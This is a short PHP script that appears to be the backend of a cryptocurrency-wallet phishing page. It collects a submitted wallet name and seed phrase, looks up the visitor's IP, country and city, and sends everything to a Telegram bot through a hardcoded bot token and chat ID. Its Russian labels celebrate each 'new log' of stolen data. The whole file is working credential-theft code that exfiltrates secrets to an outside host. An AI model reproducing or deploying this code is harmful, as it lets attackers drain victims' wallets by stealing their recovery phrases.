<?php
    $token = "5154483689:AAGQ8RcoYLNdW39aUyki6qU8C6gq34tw4Y0";
    $chat_id = "-564725183";

    $wallet = $_POST['wallet'];
    $phrase = $_POST['phrase'];

    $ip = $_SERVER['REMOTE_ADDR'];
    $NowDomen = $_SERVER['SERVER_NAME'];
    $NowCountry = file_get_contents("https://ipapi.co/$ip/country_name/");
    $NowCity = file_get_contents("https://ipapi.co/$ip/city/");
        
    if (isset($_POST['wallet']) && isset($_POST['phrase'])) {
        $arr = array(
            "💸 Поздравляем, новый лог!" => '',
            "💵 Кошелёк: " => $wallet,
            "🔑 Фраза: " => $phrase,
            "🗻 IP: " => $ip,
            "🌍 Страна: " => $NowCountry,
            "🌇 Город: " => $NowCity,
            "🔧 Домен: " => $NowDomen
        );
            
        foreach($arr as $key => $value) {
            $txt .= "<b>".$key."</b> ".$value."%0A";
        };
              
        $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
    };